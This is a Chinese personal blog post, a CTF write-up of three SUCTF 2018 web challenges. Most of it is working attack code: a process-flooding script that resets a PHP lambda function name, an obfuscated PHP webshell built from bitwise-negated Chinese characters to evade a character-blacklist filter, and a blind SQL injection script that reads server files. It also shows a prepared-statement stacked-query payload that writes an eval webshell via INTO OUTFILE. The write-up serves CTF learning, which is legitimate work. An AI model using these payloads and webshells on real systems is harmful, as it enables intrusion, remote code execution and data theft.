
<!DOCTYPE html>
<html lang="zh-Hans">
    <head>
        <title>SUCTF-WEB</title>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=2.0">
<link rel="stylesheet", href="/./css/style.css">
<link rel="shortcut icon", href="/../../../../images/favicon.ico">
<link rel="apple-touch-icon", href="/./apple-touch-icon.png">

        
    
    <link rel='stylesheet' href="/./css/dracula.css">

    </head>
    <body>
        <header class="al_header al_pos_fixed">
    <div class="al_header_container dis_flex_jcenter">
        <div class="al_header_container_left">
            <div class="al_header_site_title">
                <a href="/">Altm4nz's blog</a>
            </div>
        </div>

        <div class="dis_flex_jcenter">
            <div class="al_header_setting">
                <svg class="al_header_icon">
                    <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-menu"></use>
                </svg>
            </div>
        </div>
    </div>
</header>

        <div class="al_sidebar">

    <div class="al_sidebar_overlay al_full_cover"></div>

    <div class="al_pos_fixed al_sidebar_cnt">
        <div class="dis_flex_acenter al_sidebar_header">
            <h3>Altm4nz's blog</h3>
            <div class="al_sidebar_close al_header_setting">
                <svg class="al_header_icon">
                    <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-close"></use>
                </svg>
            </div>
        </div>

        <div class="al_sidebar_author_cnt">

            <div class="al_sidebar_author_info">
                
                <img class="al_sidebar_avatar" src="../../../../images/IMG_4178.JPG">
                <p></p>
                <h4>WEB划水选手</h4>
            </div>

            
        </div>
    </div>
</div>

        
    <div class="dis_flex_center al_lightbox_cnt al_full_cover">
        <img class="al_lightbox_img"/>
    </div>
    <div class="al_page_background dis_flex_center al_full_cover"></div>
    <div class="al_page_container">
        <div class="al_pos_ab al_fake_background"></div>
        <div class="al_main_container al_shadow al_main_page_container">
            <article class="al_article">
                <header>
                    <h1 class="al_page_title">
                        SUCTF-WEB
                    </h1>
                    <div class="al_page_info dis_flex">
                        <div class="al_page_content_info">
                            May 30, 2018 07:05 AM
                        </div>

                        
                            <div class="al_page_content_info">
                                932 words
                            </div>
                        

                        
                            <div class="al_page_content_info">
                                4 minutes read
                            </div>
                            <div class="al_page_content_info">
                                本文总阅读量<span id="busuanzi_value_page_pv"></span>次
                            </div>
                        
                        <span class="tags"></span>
                    </div>
                </header>

                
                    <div class="al_page_content_outline">
                        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#环境部署"><span class="toc-text">环境部署</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#annonymous"><span class="toc-text">annonymous</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MultiSql"><span class="toc-text">MultiSql</span></a></li></ol></li></ol>
                    </div>
                

                
                <section id="post-body">
                    <p>比赛时没时间做，官方赛后给出了writeup和docker镜像，好评。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">suctf/<span class="number">2018</span>-web-multi_sql</span><br><span class="line">suctf/<span class="number">2018</span>-web-homework</span><br><span class="line">suctf/<span class="number">2018</span>-web-hateit</span><br><span class="line">suctf/<span class="number">2018</span>-web-getshell</span><br><span class="line">suctf/<span class="number">2018</span>-web-annonymous</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h1><p>docker还是很方便，一键部署，示例annonymous</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull suctf/<span class="number">2018</span>-web-annonymous</span><br><span class="line">docker run -d -p <span class="number">6666</span>:<span class="number">80</span> suctf/<span class="number">2018</span>-web-annonymous</span><br></pre></td></tr></table></figure>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="annonymous"><a href="#annonymous" class="headerlink" title="annonymous"></a>annonymous</h2><p>php审计题，源码很短</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$MY = create_function(<span class="string">""</span>,<span class="string">"die(`cat flag.php`);"</span>);</span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"function SUCTF_$hash()&#123;"</span></span><br><span class="line">    .<span class="string">"global \$MY;"</span></span><br><span class="line">    .<span class="string">"\$MY();"</span></span><br><span class="line">    .<span class="string">"&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'func_name'</span>]))&#123;</span><br><span class="line">    $_GET[<span class="string">"func_name"</span>]();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>首先使用了create_function函数创建了一个打印flag的函数并赋值给$MY<br>然后又随机命名了了一个执行$My的函数，那么我们有两个方法去打印flag<br>1.执行SUCTF_$hash()<br>2.执行$MY()<br>方法一中 openssl_random_pseudo_bytes(32)预测显然不可能<br>只能尝试爆破create_function()产生的函数名。本地测试打印$MY，发现函数名为%00lambda_1，且每访问一次+1。<br>如果%00lambda_x不是很大。我们可以不停访问一个很大的值n，让x增长到n即可。<br>如果已经x很大，那么这个办法就不行了，就需要让apache开启新的进程使得x从一开始。<br>用上现成POC</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: UTF-8</span></span><br><span class="line"><span class="comment"># Author: orange@chroot.org</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line">        PORT = <span class="number">12344</span></span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((HOST, PORT))</span><br><span class="line">        s.sendall(<span class="string">'GET / HTTP/1.1\nHost: 127.0.0.1\nConnection: Keep-Alive\n\n'</span>)</span><br><span class="line">        <span class="comment"># s.close()</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'ok'</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">i = <span class="number">8</span></span><br><span class="line">pool = ThreadPool( i )</span><br><span class="line">result = pool.map_async( run, range(i) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure>
<p>修改HOST和端口，然后运行脚本，apache会不断kill掉旧进程fork新进程，访问%00lambda_1得到flag</p>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>绕过waf上传文件getshell，列出后台的waf</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$black_char = <span class="keyword">array</span>(<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'g'</span>, <span class="string">'h'</span>, <span class="string">'i'</span>, <span class="string">'j'</span>, <span class="string">'k'</span>, <span class="string">'l'</span>, <span class="string">'m'</span>, <span class="string">'n'</span>, <span class="string">'o'</span>, <span class="string">'p'</span>, <span class="string">'q'</span>, <span class="string">'r'</span>, <span class="string">'s'</span>, <span class="string">'t'</span>, <span class="string">'u'</span>, <span class="string">'v'</span>, <span class="string">'w'</span>, <span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>,<span class="string">' '</span>, <span class="string">'!'</span>, <span class="string">'"'</span>, <span class="string">'#'</span>, <span class="string">'%'</span>, <span class="string">'&amp;'</span>, </span><br><span class="line"><span class="string">'*'</span>, <span class="string">','</span>, <span class="string">'-'</span>, <span class="string">'/'</span>, <span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">':'</span>, <span class="string">'&lt;'</span>, <span class="string">'&gt;'</span>, <span class="string">'?'</span>, <span class="string">'@'</span>, <span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>, <span class="string">'F'</span>, <span class="string">'G'</span>, <span class="string">'H'</span>, <span class="string">'I'</span>, <span class="string">'J'</span>, <span class="string">'K'</span>, <span class="string">'L'</span>, <span class="string">'M'</span>, <span class="string">'N'</span>, <span class="string">'O'</span>, <span class="string">'P'</span>, <span class="string">'Q'</span>, </span><br><span class="line"><span class="string">'R'</span>, <span class="string">'S'</span>, <span class="string">'T'</span>, <span class="string">'U'</span>, <span class="string">'V'</span>, <span class="string">'W'</span>, <span class="string">'X'</span>, <span class="string">'Y'</span>, <span class="string">'Z'</span>, <span class="string">'\\'</span>, <span class="string">'^'</span>, <span class="string">'`'</span>,  <span class="string">'|'</span>, <span class="string">'+'</span> , <span class="string">'&#123;'</span> , <span class="string">'&#125;'</span>,<span class="string">"'"</span>);</span><br></pre></td></tr></table></figure>
<p>做法：<br>~(X) 当X为一个汉字时对这个汉字取反第二位可以得到得到一个英文字符，我们利用这个性质构造webshell。<br>eval是一种语言结构而不是函数，所以不能使用变量函数来调用它.这里可以使用asser代替。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$______=_;</span><br><span class="line">$_=~(瞰);</span><br><span class="line">$__=$_[$_==$_];</span><br><span class="line">$_=~(范);</span><br><span class="line">$__=$__.$_[$_==$_];</span><br><span class="line">$_=~(范);</span><br><span class="line">$__=$__.$_[$_==$_];</span><br><span class="line">$_=~(皮);</span><br><span class="line">$__=$__.$_[$_==$_];</span><br><span class="line">$_=~(半);</span><br><span class="line">$__=$__.$_[$_==$_];</span><br><span class="line">$_=~(拉);</span><br><span class="line">$__=$__.$_[$_==$_];</span><br><span class="line">$_=~(为);</span><br><span class="line">$___=$_[$_==$_];</span><br><span class="line">$_=~(了);</span><br><span class="line">$___=$___.$_[$_==$_];</span><br><span class="line">$_=~(高);</span><br><span class="line">$___=$___.$_[$_==$_];</span><br><span class="line">$___=$______.$___;</span><br><span class="line">$_=$$___;<span class="comment">//$_=Array</span></span><br><span class="line">$__($_[_])<span class="comment">//$__=assert</span></span><br></pre></td></tr></table></figure>
<p>密码是_<br>执行命令system(%27cat%20./../../../../Th1s_14_f14g%27)拿到flag</p>
<h2 id="MultiSql"><a href="#MultiSql" class="headerlink" title="MultiSql"></a>MultiSql</h2><p>注册进去后在用户信息中找到注入点，进行盲注</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://104.131.107.84:8588/user/user.php?id=2-(mid(user(),1,1)&gt;binary(0x2a))</span><br></pre></td></tr></table></figure>
<p>过滤了select等东西，又提示flag不再数据库中，尝试读文件。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">code=<span class="string">''</span></span><br><span class="line">cookie=&#123;</span><br><span class="line">    <span class="string">'PHPSESSID'</span>:<span class="string">'6tq2gt2c31o1reeq4j962sodt6'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">255</span>):</span><br><span class="line">        url=<span class="string">'http://104.131.107.84:8588/user/user.php?id=2-(mid(load_file(0x2f7661722f7777772f68746d6c2f757365722f757365722e706870),%d,1)=binary(%s))'</span>%(i,hex(j))</span><br><span class="line">        r=requests.get(url=url,cookies=cookie)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'admin'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            code+=hex(j)[<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">print</span> code</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>将文件以16进制打印出来，然后转换成文本。<br>发现user.php是使用mysqli_multi_query进行查询的.<br>mysqli_multi_query:执行多个针对数据库的查询<br>所以这里应该就是写shell的地方。<br>为了绕过select和单引号，我们使用MYSQL预处理语句:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @sql = concat(<span class="string">'create table '</span>,newT,<span class="string">' like '</span>,old);</span><br><span class="line">prepare s1 <span class="keyword">from</span> @sql;</span><br><span class="line">execute s1;</span><br></pre></td></tr></table></figure>
<p>将</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="string">"&lt;?php @eval($_POST['a']);?&gt;"</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'/var/www/html/favicon/altman.php'</span>;</span><br></pre></td></tr></table></figure>
<p>进行编码<br>贴上一个编码脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">b=<span class="string">''</span></span><br><span class="line">a=<span class="string">'''select "&lt;?php @eval($_POST['a']);?&gt;" into outfile '/var/www/html/favicon/altman.php';'''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(a)):</span><br><span class="line">    b+=<span class="string">'CHAR('</span>+str(ord(a[i]))+<span class="string">'),'</span></span><br><span class="line"><span class="keyword">print</span> b</span><br></pre></td></tr></table></figure>
<p>然后写入<br><img src="/2018/05/30/SUCTF-WEB/1.png" alt=""><br>执行命令拿到flag<br><img src="/2018/05/30/SUCTF-WEB/2.png" alt=""></p>

                </section>

                
                
                


            
            <nav class="dis_flex al_post_nav">
                <a class="al_post_nav_item dis_flex_acenter" href="/2018/06/18/DC0531CTF-WP/">
                    
                        <svg class="al_arrow">
                            <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-arrow-left"></use>
                        </svg>
                        <span class="al_text_ellipsis al_post_nav_desc">DC0531CTF-WP</span>
                    
                </a>
                <a class="al_post_nav_item dis_flex_acenter" href="/2018/05/28/CSTS-AWD/">
                    
                        <span class="al_text_ellipsis al_post_nav_desc">CSTS-AWD-XI'AN</span>
                        <svg class="al_arrow">
                            <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-arrow-right"></use>
                        </svg>
                    
                </a>
            </nav>
        </div>
    </div>


        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="al_index_footer dis_flex_center">



    
    

    <div class="al_index_footer_item al_index_footer_extra">
        Power By 
        <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>
    </div>

    <div class="al_index_footer_item al_index_footer_extra_right">
        All Right Reserved
    </div>
    <div class="al_index_footer_item al_index_footer_extra_right">
            本站总访问量<span id="busuanzi_value_site_pv"></span>次
    </div>
            
</div>

        <script type="text/javascript" async="async" src="/javascripts/acelog.js"></script>
        
        
        
    </body>
</html>
        